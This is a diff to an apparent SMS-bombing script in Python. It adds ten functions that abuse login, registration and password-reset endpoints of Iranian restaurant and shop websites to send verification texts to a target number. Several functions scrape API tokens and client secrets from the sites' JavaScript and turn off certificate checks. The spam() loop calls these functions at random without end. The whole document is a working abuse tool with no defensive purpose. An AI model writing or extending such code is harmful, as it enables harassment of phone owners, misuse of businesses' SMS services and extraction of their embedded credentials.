@@ -400,11 +400,147 @@ def ASM36(number):
 		return 1
 
 
+def ASM37(number):
+  data = {'mobile':number, 'version':'', 'platform':'Browser'}
+	s = requests.post('https://ojaghfood.ir/api/v1/login', data = data).json()
+	if(s['code'] == 100):
+		return 1
+
+
+def ASM38(number):
+	number = '0' + number
+	s = requests.get('https://www.nayebweb.com/2.4.8.9/js/app.js', verify = False).text
+	tkn = (s.split('"},auth:{token:"'))[1].split('",secret:{web:"')[0]
+	cst = (s.split('",secret:{web:"'))[1].split('"}},')[0]
+	jdata = {'apiToken':tkn, 'clientSecret':cst, 'device':'web', 'username':number}
+	r = requests.post('https://restaurant.delino.com/user/register', verify = False, json = jdata).json()
+	if(r['message'] == 'CONFIRMATION_CODE_SENT' and r['successful'] == True):
+		return 1
+	elif(r['message'] == 'USER_ALREADY_REGISTERED' and r['successful'] == True):
+		q = requests.post('https://restaurant.delino.com/user/resetPassword', verify = False, json = jdata).json()
+		if(q['message'] == 'CONFIRMATION_CODE_SENT' and q['successful'] == True):
+			return 1
+
+
+def ASM39(number):
+	number = '0' + number
+	s = requests.get('https://dolphin-fastfood.com/2.4.2.9/js/app.js', verify = False).text
+	tkn = (s.split('"},auth:{token:"'))[1].split('",secret:{web:"')[0]
+	cst = (s.split('",secret:{web:"'))[1].split('"}},')[0]
+	jdata = {'apiToken':tkn, 'clientSecret':cst, 'device':'web', 'username':number}
+	r = requests.post('https://restaurant.delino.com/user/register', verify = False, json = jdata).json()
+	if(r['message'] == 'CONFIRMATION_CODE_SENT' and r['successful'] == True):
+		return 1
+	elif(r['message'] == 'USER_ALREADY_REGISTERED' and r['successful'] == True):
+		q = requests.post('https://restaurant.delino.com/user/resetPassword', verify = False, json = jdata).json()
+		if(q['message'] == 'CONFIRMATION_CODE_SENT' and q['successful'] == True):
+			return 1
+
+
+def ASM40(number):
+	number = '0' + number
+	s = requests.get('https://order.alafood.ir/2.5.7/js/app.js', verify = False).text
+	tkn = (s.split('"},auth:{token:"'))[1].split('",secret:{web:"')[0]
+	cst = (s.split('",secret:{web:"'))[1].split('"}},')[0]
+	jdata = {'apiToken':tkn, 'clientSecret':cst, 'device':'web', 'username':number}
+	r = requests.post('https://restaurant.delino.com/user/register', verify = False, json = jdata).json()
+	if(r['message'] == 'CONFIRMATION_CODE_SENT' and r['successful'] == True):
+		return 1
+	elif(r['message'] == 'USER_ALREADY_REGISTERED' and r['successful'] == True):
+		q = requests.post('https://restaurant.delino.com/user/resetPassword', verify = False, json = jdata).json()
+		if(q['message'] == 'CONFIRMATION_CODE_SENT' and q['successful'] == True):
+			return 1
+
+
+def ASM41(number):
+	number = '0' + number
+	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
+	s = requests.get('https://bamafastfood.com/1.0.1/app.js', verify = False).text
+	tkn = (s.split('",token:"'))[1].split('",secret:"')[0]
+	cst = (s.split('",secret:"'))[1].split('",device:"')[0]
+	jdata = {'apiToken':tkn, 'clientSecret':cst, 'device':'web', 'username':number}
+	r = requests.post('https://restaurant.delino.com/user/register', verify = False, json = jdata).json()
+	if(r['message'] == 'CONFIRMATION_CODE_SENT' and r['successful'] == True):
+		return 1
+	elif(r['message'] == 'USER_ALREADY_REGISTERED' and r['successful'] == True):
+		q = requests.post('https://restaurant.delino.com/user/resetPassword', verify = False, json = jdata).json()
+		if(q['message'] == 'CONFIRMATION_CODE_SENT' and q['successful'] == True):
+			return 1
+
+
+def ASM42(number):
+	number = '0' + number
+	s = requests.get('https://api.perperook.ir/v1/Customer/ValidatePhone?phoneNo=' + number + '&userId=null&addressId=null').text
+	if(s == 'true'):
+		djson = {'lastname':'b', 'mobile':number, 'name':"a"}
+		r = requests.post('https://api.perperook.ir/v1/Account/Register', json = djson).text
+		if(r != ''):
+			return 1
+	elif(s == 'false'):
+		q = requests.post('https://api.perperook.ir/v1/Account/ResetPassword?mobile=' + number).text
+		if(q == '0'):
+			return 1
+
+
+def ASM43(number):
+	number = '0' + number
+	s = requests.get('https://barooj.ir/assets/js/script.js').text
+	tkn = (s.split('var token = "'))[1].split('";')[0]
+	headers = {'Accept':'*/*', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'baroojapi.barooj.ir', 'Origin':'https://barooj.ir', 'Referer':'https://barooj.ir/', 'TE':'Trailers', 'token':tkn, 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'}
+	r = requests.get('https://baroojapi.barooj.ir/v1/Users/User/GetMobileActivationCode?mobileNumber=' + number, headers = headers).text
+	if('Activation code sent-new User' in r or 'Activation code sent-old User' in r):
+		return 1
+
+
+def ASM44(number):
+	number = '0' + number
+	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
+	s = requests.get('https://shop.deyfriedchicken.com/2.5.4/js/app.js').text
+	tkn = (s.split('"},auth:{token:"'))[1].split('",secret:{web:"')[0]
+	cst = (s.split('",secret:{web:"'))[1].split('"}},')[0]
+	jdata = {'apiToken':tkn, 'clientSecret':cst, 'device':'web', 'username':number}
+	r = requests.post('https://restaurant.delino.com/user/register', verify = False, json = jdata).json()
+	if(r['message'] == 'CONFIRMATION_CODE_SENT' and r['successful'] == True):
+		return 1
+	elif(r['message'] == 'USER_ALREADY_REGISTERED' and r['successful'] == True):
+		q = requests.post('https://restaurant.delino.com/user/resetPassword', verify = False, json = jdata).json()
+		if(q['message'] == 'CONFIRMATION_CODE_SENT' and q['successful'] == True):
+			return 1
+
+
+def ASM45(number):
+	number = '0' + number
+	s = requests.get('https://telepizza.co.ir/main.fc6126e7fd963cf13eef.js').text
+	tkn = (s.split('",this.token="'))[1].split('",')[0]
+	headers = {'Accept':'application/json, text/plain, */*', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-US,en;q=0.5', 'Authorization':'Bearer ' + tkn, 'Connection':'keep-alive', 'Content-Length':'18', 'Content-Type':'application/x-www-form-urlencoded', 'Host':'telepizza.co.ir', 'Origin':'https://telepizza.co.ir', 'Referer':'https://telepizza.co.ir/login', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'}
+	data = {'mobile':number}
+	r = requests.post('https://telepizza.co.ir/site/login', headers = headers, data = data).json()
+	data = {'userId':r['id']}
+	q = requests.post('https://telepizza.co.ir/site/sendVerifySms', headers = headers, data = data).json()
+	if(q['msg'] == 'کد تایید با موفقیت ارسال شد'):
+		return 1
+
+
+def ASM46(number):
+	number = '0' + number
+	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
+	data = {'username':number, 'action':'login', 'ajax':'1'}
+	headers = {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'}
+	s = requests.post('https://www.onlinekala.ir/login', verify = False, headers = headers, data = data).json()
+	if('<h4>کد ارسال شده را وارد کنید:</h4>' in s['content']):
+		return 1
+	elif('<h4>ثبت نام</h4>' in s['content']):
+		data = {'id_customer':'', 'back':'', 'firstname':'a', 'lastname':'b', 'email':'', 'password':'', 'action':'register', 'username':number, 'ajax':'1'}
+		r = requests.post('https://www.onlinekala.ir/login', verify = False, headers = headers, data = data).json()
+		if('<h4>کد ارسال شده را وارد کنید:</h4>' in r['content']):
+			return 1
+
+
 def spam(phonenum):
 	done = 0
 	while(True):
 		try:
-			k = eval('ASM' + str(random.randint(1, 36)) + '(phonenum)')
+			k = eval('ASM' + str(random.randint(1, 46)) + '(phonenum)')
 			time.sleep(1)
 		except requests.exceptions.ConnectionError:
 			continue
